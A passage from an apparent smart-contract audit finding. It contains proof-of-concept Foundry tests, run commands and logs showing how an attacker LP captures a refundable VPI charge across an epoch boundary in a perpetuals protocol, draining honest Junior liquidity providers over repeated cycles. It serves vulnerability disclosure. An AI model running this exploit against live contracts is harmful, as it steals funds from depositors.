        uint256 victimStart = juniorVault.convertToAssets(juniorVault.balanceOf(victimJunior));
        uint256 startTime = _now();
        Outcome memory o;
        for (uint256 i; i < 3; ++i) {
            o = _roundTrip(true);
            emit log_named_uint("cycle", i + 1);
            emit log_named_decimal_uint(
                "  attacker cumulative profit        ", o.attackerLpOut + o.attackerTraderOut - attackerCapital, 6
            );
            emit log_named_decimal_uint("  victim Junior cumulative loss     ", victimStart - o.victimJuniorValue, 6);
        }
        emit log_named_uint("elapsed hours", (_now() - startTime) / 1 hours);
        assertGt(o.attackerLpOut + o.attackerTraderOut, attackerCapital + 20_000e6, "three profitable cycles");
        assertLt(o.victimJuniorValue, victimStart - 30_000e6, "victim Junior drained cycle after cycle");
    }

    /// @dev The few seconds of exposure do not carry the result. Here the close fills 2 bp against the LONG,
    ///      several times a realistic move for that window, after the LP epoch has already settled.
    function test_PoC_ProfitSurvivesAdverseCloseTick() public {
        uint256 attackerCapital = ATTACKER_JUNIOR + TRADER_FUNDS;
        Outcome memory o = _roundTrip(true, PRICE + 2e4);
        emit log_named_decimal_uint(
            "attacker net profit with a 2 bp adverse close", o.attackerLpOut + o.attackerTraderOut - attackerCapital, 6
        );
        assertGt(o.attackerLpOut + o.attackerTraderOut, attackerCapital + 5000e6, "still profitable");
    }

}
```


### Run

From `packages/perps`, with the pinned Foundry 1.5.1 build:

```bash
forge test --match-path 'test/perps/poc/PLE002VpiNavExit.t.sol' -vv
```

The same file also passes with the repository's default configuration (`forge test --match-path 'test/perps/poc/PLE002VpiNavExit.t.sol' -vv` from `packages/perps`, 193 files compiled); the environment variables above only shorten the build and keep artefacts out of the repository.

### Test Results

```text
Ran 3 tests for test/perps/poc/PLE002VpiNavExit.t.sol:PLE002VpiNavExit
[PASS] test_PoC_JuniorExitCapturesRefundableVpi() (gas: 7450549)
Logs:
  CONTROL: attacker LP enters and exits, no position
  ATTACK: same LP round trip with the attacker's position open across the boundary
    pool depth at open                : 25500002.000000
    VPI charge paid at open           : 19606.861219
    pool depth at close               : 10502713.870454
    net rebate credited at close      : 15106.706473
  attacker capital in                 : 15080000.000000
  attacker total out, control         : 15079874.753701
  attacker total out, attack          : 15088394.936019
    attacker LP out, control          : 14999874.753701
    attacker LP out, attack           : 15016894.990765
    attacker trader out, attack       : 71499.945254
  victim Junior value, control        : 2499906.066868
  victim Junior value, attack         : 2487385.947830
  victim Senior value, control        : 8000219.179415
  victim Senior value, attack         : 8000219.220004
  treasury fees, attack               : 3999.900000
  ATTACKER NET PROFIT (USDG)          : 8394.936019
  VICTIM JUNIOR LOSS vs control (USDG): 12520.119038

[PASS] test_PoC_ProfitSurvivesAdverseCloseTick() (gas: 5717508)
Logs:
    pool depth at open                : 25500002.000000
    VPI charge paid at open           : 19606.861219
    pool depth at close               : 10502713.870454
    net rebate credited at close      : 13105.906473
  attacker net profit with a 2 bp adverse close: 6394.136019

[PASS] test_PoC_RepeatedCycles() (gas: 15629763)
Logs:
    pool depth at open                : 25500002.000000
    VPI charge paid at open           : 19606.861219
    pool depth at close               : 10502713.870454
    net rebate credited at close      : 15106.706473
  cycle: 1
    attacker cumulative profit        : 8394.936019
    victim Junior cumulative loss     : 12614.052159
    pool depth at open                : 25487607.163981
    VPI charge paid at open           : 19616.396199
    pool depth at close               : 10490308.207319
    net rebate credited at close      : 15116.241402
  cycle: 2
    attacker cumulative profit        : 16810.234083
    victim Junior cumulative loss     : 25248.431773
    pool depth at open                : 25475191.965917
    VPI charge paid at open           : 19625.956145
    pool depth at close               : 10477882.136538
    net rebate credited at close      : 15125.801308
  cycle: 3
    attacker cumulative profit        : 25245.964770
    victim Junior cumulative loss     : 37903.250011
  elapsed hours: 9

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 25.52ms (32.75ms CPU time)

Ran 1 test suite in 26.44ms (25.52ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

### Test Results Explanation

- `VPI charge paid at open: 19606.861219` is approximately `0.01 * (10M)^2 / (2 * 25.5M)`, the release curve at the pre-exit depth (skew is valued at the adverse fill price).
- `net rebate credited at close: 15106.706473` is that charge returned, less the 4,000 close fee (which nets against the rebate and stays in the pool) and about 500 of adverse-confidence price shift across entry and exit. The refund equals the lifetime charge; it is not enlarged by the lower depth at close.
- `attacker LP out`: 14,999,874.75 in the control (it loses 125.25 to the Senior coupon) against 15,016,894.99 in the attack. The difference, 17,020.24, is the attacker's 85.7% Junior share of the charge and of the roughly 250 USDG by which the fresh position is marked down for its adverse entry price.
- `attacker trader out: 71499.945254` from 80,000: it paid two fees and the confidence shift, and got its VPI back.
- `attacker total out`: 15,088,394.94 from 15,080,000 of capital, so +8,394.94. The control total is below capital.
- `victim Junior value`: 2,499,906.07 in the control, 2,487,385.95 in the attack. The honest Junior LP funds the refund.
- `victim Senior value` is unchanged: Junior absorbs the loss.
- `test_PoC_RepeatedCycles` repeats the loop three times in nine hours with cumulative attacker profit 25,245.96 and cumulative honest Junior loss 37,903.25.
- `test_PoC_ProfitSurvivesAdverseCloseTick` fills the close 2 bp against the position, after the epoch has settled. The attacker still nets 6,394.14 USDG. The result does not depend on the price standing still.

